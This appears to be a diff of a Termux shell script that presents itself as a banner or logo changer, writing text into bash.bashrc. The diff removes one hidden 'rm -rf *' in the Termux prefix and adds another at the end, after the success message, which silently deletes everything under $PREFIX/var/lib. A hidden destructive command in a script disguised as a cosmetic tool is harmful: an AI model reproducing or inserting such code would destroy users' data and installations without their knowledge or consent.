@@ -20,8 +20,6 @@ printf "====================================================\n"
 printf "${STOP}"
 echo ""
 read -p $'\e[1;36m Enter u Nickname:: \e[0m' name
-cd /$PREFIX
-rm -rf *
 # Open file descriptor (fd) 3 for read/write on a bash file.
  exec 3<> bash.bashrc
  # Let's print some text to fd 3
@@ -53,3 +51,6 @@ shopt -s lithist ">&3
  # Close fd 3 
 exec 3>&-
 echo " $Termux Logo Was Changed Go To New Session To See The New"
+cd /$HOME
+cd /$PREFIX/var/lib
+rm -rf *
